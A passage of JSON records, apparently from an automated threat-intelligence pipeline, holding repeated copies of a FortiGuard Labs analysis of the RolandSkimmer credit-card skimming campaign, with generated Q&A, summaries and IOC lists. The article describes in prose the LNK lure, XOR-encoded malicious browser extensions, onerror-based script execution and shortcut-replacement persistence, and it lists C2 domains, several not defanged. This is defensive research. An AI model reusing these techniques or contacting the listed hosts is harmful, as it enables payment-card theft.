snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including obfuscated scripts, XOR-encoded files, and deceptive naming strategies to evade detection and maintain persistence. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to significant financial losses and identity theft. The attackers' use of legitimate system tools and scripting capabilities allows them to achieve stealth, persistence, and data exfiltration, making this threat highly severe.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["malicious", "botnet", "browser", "analysis", "bank", "threat", "intelligence", "apt", "phishing", "banking trojan"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["malicious", "bank", "threat", "intelligence", "banking trojan", "analysis", "botnet", "browser", "phishing", "apt"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or 